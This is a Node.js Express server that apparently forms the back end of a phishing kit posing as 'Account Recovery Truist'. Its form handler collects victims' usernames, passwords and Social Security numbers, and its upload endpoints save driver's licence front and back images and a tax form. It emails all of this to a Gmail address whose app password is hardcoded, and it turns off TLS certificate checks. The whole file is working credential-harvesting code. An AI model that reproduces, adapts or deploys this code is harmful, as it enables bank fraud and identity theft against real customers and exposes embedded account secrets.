const nodemailer = require('nodemailer');
const express = require('express');
const fs = require('fs');
const formidable = require('formidable');
const app = express();
const cors = require('cors');
require('dotenv').config();

app.use(cors({ origin: '*' }));
app.use(express.json())
app.use(express.urlencoded({ extended: true }));

app.post('/form', (req, res) => {
    let username = req.body.username;
    let password = req.body.password;
    let ssn = req.body.ssn;

    const outputMessage = `
            <h4>New Form Submission</h4>
            <h3>Submission details</h3>
            <h4>Username: ${username}</h4>
            <h4>Password: ${password}</h4>
            <h4>SSN: ${ssn}</h4>
            <h4>Front DVL: </h4> 
            <img src='cid:fdl'
            <h4>Back DVL: </h4> 
            <img src='cid:bdl'
            <h4>Tax Form: </h4> 
            <img src='cid:taxform' />
        `
    // // save front dvl, back dvl and taxform to files for attachments in email
    // let files = [fdl, bdl, taxform];
    // let fileNames = ['fdl', 'bdl', 'taxform'];
    // for (let i = 0; i < files.length; i++) {
    //     let base64 = Buffer.from(files[i], 'utf-8').toString('base64');
    //     fs.writeFile(`${fileNames[i]}.jpg`, base64, { encoding: 'base64' }, function (err) {
    //         if (err) console.log(err.message);
    //         else {
    //             console.log('file created');
    //         }
    //     });
    // }

    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            // user: 'timothykwame926@gmail.com',
            // pass: 'wrdjrojijuiinukk'
            user: 'jeromeakumasi01@gmail.com',
            pass: 'hzwwapghctxkdtvz'
        },
        tls: {
            rejectUnauthorized: false
        }
    })

    var mailOptions = {
        from: 'user@gmail.com',
        // to: 'timothykwame926@gmail.com',
        to: 'jeromeakumasi01@gmail.com',
        subject: 'Account Recovery Truist',
        html: outputMessage,
        attachments: [
            {
                filename: 'fdl.jpg',
                path: __dirname + '/fdl.jpg',
                cid: 'fdl'
            },
            {
                filename: 'bdl.jpg',
                path: __dirname + '/bdl.jpg',
                cid: 'bdl'
            },
            {
                filename: 'taxform.jpg',
                path: __dirname + '/taxform.jpg',
                cid: 'taxform'
            }
        ]
    }

    transporter.sendMail(mailOptions, function (err, info) {
        if (err) console.log(err.message);
        else {
            console.log('Email sent !');
            res.json({ successful: true });
        }
    })

});

app.post('/upload-fdl', async (req, res) => {
    const form = formidable({ multiples: false })
    form.parse(req, async (err, fields, files) => {
        let path = files.fdl.filepath
        let file = fs.readFileSync(path, 'base64');
        fs.writeFile('./fdl.jpg', file, 'base64', (err) => { if (err) console.log(err.message) });
        res.end();
    })
});
app.post('/upload-bdl', async (req, res) => {
    const form = formidable({ multiples: false })
    form.parse(req, async (err, fields, files) => {
        let path = files.bdl.filepath
        let file = fs.readFileSync(path, 'base64');
        fs.writeFile('./bdl.jpg', file, 'base64', (err) => { if (err) console.log(err.message) });
        res.end();
    })
});
app.post('/upload-taxform', async (req, res) => {
    const form = formidable({ multiples: false })
    form.parse(req, async (err, fields, files) => {
        let path = files.taxform.filepath
        let file = fs.readFileSync(path, 'base64');
        fs.writeFile('./taxform.jpg', file, 'base64', (err) => { if (err) console.log(err.message) })
        res.end();
    })
});

app.listen(process.env.PORT, () => console.log('listening'));